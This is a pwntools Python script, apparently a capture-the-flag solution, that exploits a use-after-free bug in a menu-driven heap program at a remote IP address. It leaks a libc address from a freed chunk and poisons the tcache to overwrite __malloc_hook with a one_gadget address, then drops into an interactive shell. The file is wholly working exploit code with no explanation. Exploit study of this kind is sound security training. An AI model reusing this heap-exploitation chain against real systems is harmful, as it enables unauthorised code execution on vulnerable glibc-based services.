from pwn import *
#io = process('./uaf')
io = remote('47.97.58.52',44000)
libc = ELF('libc.so.6')
context(os = 'linux',arch='amd64',log_level='debug')
def add(index,size,content):
    io.sendafter(b'>> ',b'1')
    io.sendafter(b'Enter index: ',str(index).encode())
    io.sendafter(b'Enter size: ',str(size).encode())
    io.sendafter(b'Enter data: ',content)
def dele(index):
    io.sendafter(b'>> ',b'2')
    io.sendafter(b'Enter index: ',str(index).encode())
def show(index):
    io.sendafter(b'>> ',b'3')
    io.sendafter(b'Enter index: ',str(index).encode())
def edit(index,content):
    io.sendafter(b'>> ',b'4')
    io.sendafter(b'Enter index: ',str(index).encode())
    io.sendafter(b'Enter data: ',content)
add(8,0x100,p64(0))
for i in range(7):
   add(i,0x100,p64(0))
for i in range(7):
   dele(i)
dele(8)
#gdb.attach(io)
#pause()
show(8)
io.recvuntil(b'Data: ')
addr = u64(io.recvuntil(b'\n',drop = True).ljust(8,b'\x00'))
libc_base = addr - 0x7d43a8121be0 + 0x7d43a7f35000
print(hex(libc_base))
malloc_hook = libc_base + libc.symbols['__malloc_hook']
add(9,0x70,p64(0))
add(10,0x70,p64(0))
add(11,0x70,p64(0))
dele(9)
dele(10)
dele(11)
edit(11,p64(malloc_hook))
gadget1 = libc_base + 0xe3afe
gadget2 = libc_base + 0xe3b01
add(12,0x70,b'12')
add(13,0x70,p64(gadget2))
print(hex(malloc_hook))
print(hex(gadget1))
#gdb.attach(io)
#pause()
io.sendafter(b'>> ',b'1')
io.sendafter(b'Enter index: ',b'14')
io.sendafter(b'Enter size: ',b'0x70')
io.interactive()